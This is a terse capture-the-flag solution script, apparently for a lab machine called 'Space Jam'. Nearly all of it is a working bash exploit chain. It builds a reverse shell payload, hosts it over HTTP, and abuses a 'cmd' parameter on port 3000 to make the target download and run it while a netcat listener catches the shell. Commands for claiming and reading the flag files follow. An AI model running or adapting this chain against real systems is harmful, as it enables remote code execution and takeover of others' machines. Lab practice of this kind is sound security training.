# Space Jam

```bash
echo "Host IP: "
read HOST_IP

echo "Target IP: "
read TARGET_IP

echo "bash -i >& /dev/tcp/$HOST_IP/1234 0>&1" > SHELL
bg python -m http.server 

curl http://$TARGET_IP:3000/?cmd=wget%20http://$HOST_IP:8000/SHELL

bg nc -lvnp 1234

curl http://$TARGET_IP:3000/?cmd=bash%20SHELL
```

## Flags
echo USERNAME > /root/king.txt

cat /root/root.txt

cat /home/jordan/user.txt
